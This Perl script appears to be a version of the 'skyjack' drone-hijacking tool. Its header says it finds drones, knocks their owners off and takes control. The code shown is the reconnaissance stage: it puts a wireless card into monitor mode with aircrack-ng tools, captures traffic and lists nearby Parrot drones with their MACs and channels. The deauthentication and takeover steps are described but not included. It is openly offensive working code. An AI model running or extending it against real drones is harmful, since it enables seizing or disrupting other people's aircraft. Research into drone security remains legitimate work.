#!/usr/bin/perl

# skyjack, by samy kamkar

# this software detects flying drones, deauthenticates the
# owner of the targetted drone, then takes control of the drone

# by samy kamkar, code@samy.pl
# http://samy.pl
# dec 2, 2013


# mac addresses of ANY type of drone we want to attack
# Parrot owns the 90:03:B7 block of MACs and a few others
# see here: http://standards.ieee.org/develop/regauth/oui/oui.txt
my @drone_macs = qw/90:03:B7 A0:14:3D 00:12:1C 00:26:7E/;


use strict;

my $interface  = shift || "wlan0";
my $interfaceMon  = shift || "wlan0mon";

# paths to applications
my $dhclient	= "dhclient";
my $iwconfig	= "iwconfig";
my $ifconfig	= "ifconfig";
my $airmon	= "airmon-ng";
my $aireplay	= "aireplay-ng";
my $aircrack	= "aircrack-ng";
my $airodump	= "airodump-ng";
my $nodejs	= "nodejs";

# sudo("airmon-ng", "check", "kill");

# put device into monitor mode
# sudo($ifconfig, $interface, "down");
sudo($airmon, "start", $interface);

# tmpfile for ap output
my $tmpfile = "tmp/dronestrike";
my %skyjacked;


eval {
	local $SIG{INT} = sub { die };
	print "Running: sudo $airodump --output-format csv -w $tmpfile $interfaceMon\n";
	my $pid = open(DUMP, "|sudo $airodump --output-format csv -w $tmpfile $interfaceMon >>/dev/null 2>>/dev/null") || die "Can't run airodump ($airodump): $!";
	# print "pid $pid\n";

	# wait 5 seconds then kill
	# sleep 2;
	# print DUMP "\cC";
	sleep 4;
	sudo("kill", $pid);
	sleep 1;
	sudo("kill", "-HUP", $pid);
	sleep 1;
	sudo("kill", "-9", $pid);
	sleep 1;
	sudo("killall", "-9", $aireplay, $airodump);
	#kill(9, $pid);
	close(DUMP);
};


my %clients;
my %chans;
foreach my $tmpfile1 (glob("$tmpfile*.csv"))
{
	open(APS, "<$tmpfile1") || print "Can't read tmp file $tmpfile1: $!";
	while (<APS>)
	{
		# strip weird chars
		s/[\0\r]//g;

		foreach my $dev (@drone_macs)
		{
			# determine the channel
			if (/^($dev:[\w:]+),\s+\S+\s+\S+\s+\S+\s+\S+\s+(\d+),.*(ardrone\S+),/)
			{
				#print "CHANNEL $1 $2 $3\n";
				$chans{$1} = [$2, $3];
			}

			# grab our drone MAC and owner MAC
			if (/^([\w:]+).*\s($dev:[\w:]+),/)
			{
				# print "CLIENT $1 $2\n";
				$clients{$1} = $2;
			}
		}
	}
	close(APS);
	sudo("rm", $tmpfile1);
	#unlink($tmpfile1);
}
print "\n\n";
print "LABEL|CLIENT_MAC|DRONE_ID|DRONE_MAC|DRONE_CHANNEL\n";

foreach my $cli (keys %clients)
{
	print "DATA|$cli|$chans{$clients{$cli}}[1]|$clients{$cli}|$chans{$clients{$cli}}[0]\n";
}
	
sub sudo
{
	# print "Running: @_\n";
	system("sudo", @_);
}
